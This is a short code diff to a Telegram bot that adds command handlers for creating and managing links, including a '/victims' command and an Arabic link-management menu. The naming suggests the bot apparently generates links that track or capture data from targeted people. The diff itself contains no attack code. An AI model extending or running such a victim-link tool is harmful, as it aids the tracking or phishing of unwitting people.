@@ -1345,6 +1345,19 @@ bot.on('message', async (msg) => {
 
   if (msg.text === "/create") return createNew(chatId);
 
+  // ── Direct command handlers for commands listed in setMyCommands ────────────
+  if (msg.text === "/newlink")
+    return createNew(chatId);
+
+  if (msg.text === "/mylinks")
+    return bot.emit('callback_query', { id:'0', from:{ id:chatId }, message:{ chat:{ id:chatId }, message_id:0 }, data:'lm:list:0' });
+
+  if (["/victims", "/linkstats", "/disablelink", "/enablelink", "/deletelink"].includes(msg.text))
+    return bot.sendMessage(chatId,
+      `📋 *إدارة الروابط*\n\nاستخدم /mylinks للوصول إلى جميع خيارات إدارة روابطك (الزوار، الإحصائيات، التعطيل، الحذف وغيرها).`,
+      { parse_mode: "Markdown", reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📋 فتح روابطي", callback_data: "lm:list:0" }]] }) }
+    );
+
   if (msg.text === "/attempt") {
     const bal = userAttempts[String(chatId)] || 0;
     if (bal <= 0) return bot.sendMessage(chatId,
